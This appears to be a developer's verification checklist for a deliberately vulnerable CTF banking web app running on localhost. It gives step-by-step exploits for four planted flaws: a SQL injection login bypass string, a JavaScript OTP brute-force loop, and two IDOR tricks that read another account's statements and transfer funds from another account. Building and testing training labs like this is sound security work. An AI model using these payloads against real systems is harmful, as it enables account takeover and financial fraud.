# Vulnerabilities List - For Verification After Form Fix

**Date:** 2026-07-26  
**Status:** All fixes complete - Ready for verification

---

## ✅ Verify These 4 Vulnerabilities

### 1. auth.g1 — SQL Injection (Login Page)

**Status:** ✅ Previously verified / Re-verify after form interceptor changes

**How to Exploit:**
```
URL: http://localhost:9443/login
Customer ID: BS100234' or '1'='1
Password: anything
Click "Sign In"
```

**Expected Result:**
- [ ] Flag modal appears with "🚩 FLAG CAPTURED!"
- [ ] Flag text: BANKSPLOIT{auth.g1-...}
- [ ] Copy button enabled, OK button disabled
- [ ] After copying, OK button enables
- [ ] Click OK → Redirects to OTP page
- [ ] Can verify OTP and login successfully

**Console Output Should Show:**
```
Form submit event fired
Intercepting form submission: POST /login
=== FORM RESPONSE ===
Status: 302
X-CTF-Flag header: BANKSPLOIT{auth.g1-...}
Flag found in header: BANKSPLOIT{auth.g1-...}
```

**Parameter Used:** Customer ID in login form

---

### 2. auth.l10 — OTP Brute Force (No Rate Limiting)

**Status:** ✅ Previously verified / Re-verify after form interceptor changes

**How to Exploit:**
```
1. Login normally: BS100234 / password123
2. At OTP verification page
3. Open DevTools (F12) → Console
4. Run brute force script:
```

**Brute Force Script:**
```javascript
for(let i = 0; i <= 9999; i++) {
    const otp = String(i).padStart(4, '0');
    fetch('/api/v1/auth/verify-otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({otp: otp})
    }).then(r => r.json()).then(d => {
        if (d.ok) console.log('✅ Found OTP: ' + otp);
    });
}
```

**Expected Result:**
- [ ] No rate limiting - can attempt all 10,000 OTP codes
- [ ] Script finds correct OTP code
- [ ] Flag modal appears with "🚩 FLAG CAPTURED!"
- [ ] Flag text: BANKSPLOIT{auth.l10-...}
- [ ] Can copy and click OK
- [ ] Dashboard loads successfully

**Parameter Used:** OTP field (0000-9999) with no rate limiting

---

### 3. statements.l1 — IDOR (Account Statements) 

**Status:** ✅ FIXED THIS SESSION - First verification

**How to Exploit - Method 1 (Direct URL):**
```
1. Login: BS100234 / password123
2. Verify OTP → Go to Statements
3. Change URL to: /statements?account_id=4
4. Press Enter
```

**How to Exploit - Method 2 (Via Form - NOW FIXED):**
```
1. Login & Verify OTP → Go to Statements
2. In Account dropdown select a different account
3. Click "Apply filters" button
4. URL will show: /statements?account_id=4&from_date=...
```

**Expected Result:**
- [ ] GET form request intercepted
- [ ] Flag modal appears with "🚩 FLAG CAPTURED!"
- [ ] Flag text: BANKSPLOIT{statements.l1-...}
- [ ] Copy button enabled, OK button disabled
- [ ] After copying, OK button enables
- [ ] Click OK → Page shows other user's statements
- [ ] Can see transactions from account_id=4

**Console Output Should Show:**
```
Form submit event fired
Intercepting form submission: GET /statements
GET form URL: /statements?account_id=4&from_date=...&to_date=...&q=...
=== FORM RESPONSE ===
Status: 200
X-CTF-Flag header: BANKSPLOIT{statements.l1-...}
Flag found in header: BANKSPLOIT{statements.l1-...}
```

**Parameter Used:** `?account_id=4` (NOW RESTORED IN FORM)

**Key Fix:** 
- Form select now uses `name="account_id"` 
- Option values are numeric IDs (not account numbers)
- When you click "Apply filters", URL shows `?account_id=...`

---

### 4. transfer.l1 — IDOR (Fund Transfer)

**Status:** ✅ FIXED THIS SESSION - First verification

**How to Exploit:**
```
1. Login: BS100234 / password123
2. Verify OTP → Go to Transfer
3. Fill transfer form:
   - Beneficiary: Select any (e.g., "John Doe")
   - Amount: 1000
   - Mode: IMPS
4. Click "Continue"
5. Click "Confirm & send OTP"
6. OTP page appears

7. IMPORTANT: Click "📱 View OTP Code" button
   - See the 4-digit OTP code
   - Remember it

8. Open DevTools (F12) → Console
9. Run this command:
   document.querySelector('input[name="from_account_id"]').value = 4

10. Enter the OTP code in form
11. Click "Authorise transfer"
```

**Expected Result:**
- [ ] Flag modal appears with "🚩 FLAG CAPTURED!"
- [ ] Flag text: BANKSPLOIT{transfer.l1-...}
- [ ] Copy button enabled, OK button disabled
- [ ] After copying, OK button enables
- [ ] Click OK → Receipt page appears

**Receipt Page Should Show:**
- [ ] "✓ Transfer Successful" (with checkmark icon)
- [ ] From Account: "Savings · 1004444444" (account_id=4, NOT your account)
- [ ] To Account: "Savings · 1001111111" (beneficiary account)
- [ ] Amount: ₹1000.00
- [ ] Mode: IMPS
- [ ] Status: completed
- [ ] Reference: IMPS...
- [ ] Date: today's date
- [ ] "Download receipt" link works
- [ ] Receipt shows HTML (not JSON)

**Console Output Should Show:**
```
Form submit event fired
Intercepting form submission: POST /transfer
=== FORM RESPONSE ===
Status: 200
X-CTF-Flag header: BANKSPLOIT{transfer.l1-...}
Flag found in header: BANKSPLOIT{transfer.l1-...}
Stored pending redirect, waiting for user to close modal
```

**Parameter Used:** `from_account_id=4` (modified via console)

**Key Fixes:**
- OTP form has "View OTP Code" button
- Receipt returns HTML (not JSON)
- Receipt shows account names: "Savings · XXXX"

---

## Verification Order

**Recommended testing order:**

1. **Test auth.g1 (SQLi Login)** - Simplest, no IDOR
2. **Test auth.l10 (OTP Brute)** - No IDOR
3. **Test statements.l1 (Statements IDOR)** - NEW FIX: Form now sends account_id
4. **Test transfer.l1 (Transfer IDOR)** - NEW FIX: Receipt now HTML + flag modal

---

## Key Changes Made

| Vulnerability | Change | File | Status |
|---|---|---|---|
| statements.l1 | Form field changed to `name="account_id"` | statements/index.php | ✅ FIXED |
| statements.l1 | Option values changed to numeric IDs | statements/index.php | ✅ FIXED |
| statements.l1 | GET form interceptor added | templates/layout.php | ✅ FIXED |
| transfer.l1 | Receipt returns HTML with account names | transfer/api.php | ✅ FIXED |
| transfer.l1 | OTP View Code button added | transfer/index.php | ✅ PREVIOUS |

---

## Testing Notes

### For statements.l1:
- **Direct URL method:** `/statements?account_id=4` always works
- **Form method (NEW):** Click "Apply filters" → URL now shows `?account_id=4`
- **Form selection:** Dropdown shows account numbers, values are IDs

### For transfer.l1:
- **OTP Code access:** Click "📱 View OTP Code" button
- **from_account_id modification:** Must use console (no UI for IDOR)
- **Receipt format:** HTML page (not JSON)

### For all vulnerabilities:
- Modal must be copy + OK workflow
- X button closes without requiring copy
- Console shows interception logs
- No JavaScript errors

---

## Success Criteria

✅ All tests pass when:

1. **auth.g1** - Flag modal on SQLi login
2. **auth.l10** - Flag modal on brute-forced OTP
3. **statements.l1** - Flag modal on IDOR (form now sends `?account_id=`)
4. **transfer.l1** - Flag modal on IDOR + HTML receipt showing modified account

---

## Quick Reference - How to Find Parameters

**auth.g1:** SQLi in login form → Customer ID field
**auth.l10:** OTP brute force → 0000-9999 no rate limit
**statements.l1:** IDOR parameter → `?account_id=4` in URL (NOW IN FORM TOO)
**transfer.l1:** IDOR parameter → `from_account_id=4` in form (modify via console)

---

**Ready for verification! 🚀**

Test each vulnerability and report results.
